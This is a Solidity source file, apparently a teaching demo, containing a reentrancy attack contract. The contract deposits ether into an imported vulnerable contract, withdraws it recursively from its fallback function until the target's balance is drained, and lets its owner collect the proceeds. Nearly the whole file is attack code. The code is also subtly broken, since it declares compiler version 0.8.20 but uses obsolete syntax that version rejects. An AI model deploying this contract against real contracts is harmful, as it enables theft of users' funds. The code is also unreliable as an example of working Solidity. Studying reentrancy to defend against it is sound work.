// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;
/// @title A contract for demonstrate payable functions and addresses
/// @author Tinotenda Joe
/// @notice  This contract just show how payable functions and addresses can be attacked by reentrancy

import { Vulnerable } from "./vulnerable.sol";

contract Attack {
	Vulnerable public vulnerable; // Reference to the Vulnerable contract
	address payable owner; // To keep track of attacker's address

	// Pass the address of the contract to be attacked
	constructor(address payable _contract) public {
		vulnerable = Vulnerable(_contract);
		owner = msg.sender; // set the owner of the contract to the user deploying the contract
	}

	function attack() external payable {
		require(address(vulnerable) != address(0)); // Check if the contract address exists
		require(msg.value > 0); // Check if the fallback function is payable or not
		vulnerable.deposit.value(msg.value)(); // First deposit some ether to vulnerable contract
		vulnerable.withdraw(msg.value); // Then call the withdraw function
	}

	// Fallback function which is called whenever Attack contract receives ether
	function() external payable {
		if (address(vulnerable).balance >= msg.value) {
			vulnerable.withdraw(msg.value); // Recursive call
		}
	}

	// Collect ether
	function collectEther() public {
		require(msg.sender == owner, "You're not the contract owner"); // Only owner can collect ether
		owner.transfer(address(this).balance);
	}
}
/**
 * In this malicious contract, first, we call the deposit function to put some ether into the vulnerable
 *  contract, then we call the withdraw function to take the ether out. Since the vulnerable contract does
 *  not have any prevention against reentrancy, the malicious contract's fallback function gets called again
 *  and again through the withdraw function and the ether of the vulnerable contract gets drained.


 */
